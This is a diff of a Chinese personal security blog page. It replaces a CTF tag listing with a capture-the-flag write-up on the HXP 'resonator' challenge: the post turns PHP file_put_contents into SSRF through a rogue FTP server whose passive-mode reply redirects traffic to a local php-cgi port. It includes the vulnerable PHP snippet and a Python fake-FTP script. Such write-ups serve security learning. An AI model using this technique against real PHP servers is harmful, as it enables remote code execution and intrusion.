@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-       <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta content="yes" name="apple-mobile-web-app-capable" />
   <meta content="black" name="apple-mobile-web-app-status-bar-style" />
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>CTF | 过客</title>
+  <title>HXP resonator(利用file_put_contents打SSRF) | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="CTF | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="HXP resonator(利用file_put_contents打SSRF) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,6 +25,11 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="HXP resonator(利用file_put_contents打SSRF)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/gS01eEZwU/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
   	<!-- Navigation -->
@@ -66,114 +71,102 @@
       </div>
     </div>
   </nav>
-<!-- Page Header -->
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <div class="post-heading">
-            <h1 class="tag-tl">#CTF</h1>
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+        </span>
+            <h1>HXP resonator(利用file_put_contents打SSRF)</h1>
+            <span class="meta">
+            	Posted on
+              2021-01-13，3 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
+
+  <!-- Post Content -->
+  <article>
     <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/kp45piq14/">
-            <h2 class="post-title">
-              CTF PHP代码审计中intval，数字判断，整数溢出
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>代码分析</strong></p>
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>源码</p>
+<pre><code>&lt;?php
+$file = $_GET['file'] ?? '/tmp/file';
+$data = $_GET['data'] ?? ':)';
+file_put_contents($file, $data);
+echo file_get_contents($file);
+</code></pre>
+<p>在Docker中还有个php-cgi<br>
+那就是要用这两个函数打php-cgi<br>
+但是。这两个函数又不支持gopher。如何打呢</p>
+<p>这里可以用FTP的被动模式<br>
+在我们file_put_contents('ftp://x.x.x.x/123.php','exploit')<br>
+当FTP服务器接收到这个请求后。被动模式会重新返回一个IP和Port。然后请求会转发到新的IP和Port上。主要是为了安全。防止黑客监听20端口的流量。所以这才有被动模式。用随机的端口。进行流量交互</p>
+<p>先配置好VSFTPD的被动模式，用wireshark抓一下正常的包。<br>
+<img src="https://guokeya.github.io/post-images/1610524338840.png" alt="" loading="lazy"><br>
+用python socket实现下发送这些请求。</p>
+<pre><code>import socket
+host = '0.0.0.0'
+port = 22
+sk = socket.socket()
+sk.bind((host, port))
+sk.listen(5)
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/oUQYTq6U9/">
-            <h2 class="post-title">
-              CTF PHP代码审计中file_put_contents函数利用
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p>源码分析</p>
+conn,address = sk.accept()
+conn.send(&quot;220 (vsFTPd 3.0.3)\n&quot;);
+print conn.recv(20)
+conn.send(&quot;331 Please specify the password.\n&quot;);
+print conn.recv(20)
+conn.send(&quot;230 Login successful.\n&quot;)
+print conn.recv(20)
+conn.send(&quot;200 Switching to Binary mode.\n&quot;);
+print conn.recv(20)
+conn.send(&quot;550 Could not get file size.\n&quot;);
+print conn.recv(20)
+conn.send(&quot;227 127,0,0,1,8,6952\n&quot;)
+print conn.recv(20)
+conn.send(&quot;227 127,0,0,1,8,6952\n&quot;)
+print conn.recv(20)
+conn.send(&quot;150\n&quot;)
+conn.close()
+</code></pre>
+<p>然后测试下。发现流量确实打到本地的9000端口了<br>
+<img src="https://guokeya.github.io/post-images/1610524409318.png" alt="" loading="lazy"></p>
+<p>还有关于larval debug的RCE<code>https://www.ambionics.io/blog/laravel-debug-rce</code><br>
+它的源码有点不一样,简化后如下</p>
+<pre><code>&lt;?php
+$file=$_GET['file'];
+$data=file_get_contents($file);
+file_put_contents($file, $data);
+</code></pre>
+<p>这里我想通过vsftpd来配置的。。。然而发现pasv_address配置了半年。不生效。ipv6也关了。又搜到文章。说pasv_address只能填域名。我又把域名绑到了127.0.0.1。发现还是不行。<br>
+有大佬知道忘告知😅</p>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">1 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/Olw-A4WVi/">
-            <h2 class="post-title">
-              Mysql limit注入
-            </h2>
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/2b6jBzY5h/">
+              <span class="post-title">
+                thinkphp6的一些链子&rarr;
+              </span>
             </a>
-            <h3 class="post-subtitle">
-              <p><strong>实验环境</strong><br>
-http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
+          </p>
+        
+        <div class="comment">
+          
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/tag/CTF/page/11/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
+  </article>
  <!-- Footer -->
   <footer>
     <div class="container">
@@ -254,3 +247,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
